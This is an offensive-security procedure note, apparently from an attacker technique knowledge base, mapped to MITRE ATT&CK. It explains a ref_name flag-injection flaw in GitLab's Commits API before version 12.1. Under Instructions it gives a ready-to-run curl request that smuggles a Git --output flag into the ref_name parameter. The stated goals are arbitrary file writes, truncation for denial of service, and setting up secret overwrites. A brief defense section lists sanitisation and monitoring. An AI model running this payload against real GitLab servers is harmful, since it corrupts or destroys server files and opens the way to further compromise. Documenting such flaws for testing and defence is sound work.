---
id: proc-inject-ref-name
tags:
  - command-injection
  - gitlab
  - api
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-gitlab-commits-injection]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:24:08.798Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Unix Shell]]'
---
# Inject-Malicious-Ref-Name-in-Commits-API

## Summary

This procedure exploits the lack of sanitization in the ref_name parameter of GitLab's Commits API to inject Git flags like --output, causing arbitrary file writes via git log executed by Gitaly.

## Description

The vulnerability stems from find_commits.go in Gitaly, where ref_name is passed unsanitized to git log and rev-list, allowing flag injection starting with --. This writes commit lists to specified paths and truncates them. Tested on GitLab 12.0.3 with Docker, it requires API access to a project with commits.

## Requirements

1. GitLab instance vulnerable (pre-12.1)
2. Project ID with commits
3. curl tool
4. Network access to /api/v4/projects/{id}/repository/commits

## Defense

Defensive measures and detection strategies:

- Sanitize ref_name to reject -- prefixed values
- Log and monitor Git command executions in Gitaly
- Implement input validation in API handlers

## Objectives

1. Trigger arbitrary file write
2. Cause truncation for DoS
3. Set up for secret overwrite

## Instructions

### Step 1: Craft Malicious Request

**Context**: Prepare the injection payload targeting a test file.

**Command** ([[commands/curl-gitlab-commits-injection]]):
```bash
curl 'http://target/api/v4/projects/5/repository/commits?path=.&ref_name=--output=/tmp/written'
```

> The path=. ensures broad commit log; ref_name injects --output flag, writing to /tmp/written then truncating via rev-list.

### Step 2: Observe Backend Effects

**Context**: The API responds normally, but server-side Git commands execute.

> Expected: File /tmp/written created empty.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Unix Shell]]

### Sub-Techniques


## Commands Used

- [[commands/curl-gitlab-commits-injection]]

## Tools Used

- [[tools/curl]]

## Tags

- [[command-injection]]
- [[gitlab]]
